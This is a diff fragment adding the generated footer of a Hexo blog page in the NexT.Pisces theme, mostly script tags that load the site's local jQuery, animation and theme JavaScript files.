+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+          <span id="scrollpercent"><span>0</span>%</span>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
